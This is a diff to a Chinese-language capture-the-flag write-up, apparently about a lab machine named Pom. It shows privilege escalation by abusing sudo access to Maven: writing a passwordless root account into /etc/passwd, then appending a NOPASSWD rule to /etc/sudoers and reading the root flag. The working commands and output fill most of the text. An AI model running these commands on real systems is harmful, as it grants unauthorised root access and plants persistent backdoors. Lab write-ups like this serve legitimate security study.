@@ -662,7 +662,7 @@ uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
 ```
 先写好pom.xml然后用maven拉取，拉取的时候就执行了里面的命令加上了suid，看到加成功了，但是不知道为什么提权还是失败了。
 不能这样提权，那就尝试一下添加一个用户
-用root权限加一个有root权限的用户
+用root权限加一个有root权限的用户，密码设为空
 这里换了`exec-maven-plugin`插件，就不用写`pom`文件了
 ```bash
 bash-5.2# echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/newpasswd
@@ -674,4 +674,27 @@ su: incorrect password
 - maven 执行 `/bin/sh`
 - `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
 - root 往 `/etc/passwd` 里添加了一行`hacker::0:0:root:/root:/bin/bash`
-但是这里还是失败了，原因是我们设置的是空密码
+但是这里还是失败了，原因是我们设置的是空密码不能登录
+最后听ai的
+```bash
+bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'echo \"terra536 ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers'"
+[INFO] Scanning for projects...
+[INFO]
+[INFO] ---------------------------< hacker:exploit >---------------------------
+[INFO] Building exploit 1.0
+[INFO]   from pom.xml
+[INFO] --------------------------------[ jar ]---------------------------------
+[INFO]
+[INFO] --- exec:3.6.3:exec (default-cli) @ exploit ---
+[INFO] ------------------------------------------------------------------------
+[INFO] BUILD SUCCESS
+[INFO] ------------------------------------------------------------------------
+[INFO] Total time:  2.855 s
+[INFO] Finished at: 2026-05-01T22:56:54+08:00
+[INFO] ------------------------------------------------------------------------
+bash-5.2# sudo su -
+root@Pom:~# ls /root
+root.txt
+root@Pom:~# cat root.txt
+flag{root-4a29b2f65b40052a804c0cc4afb906bd}
+```
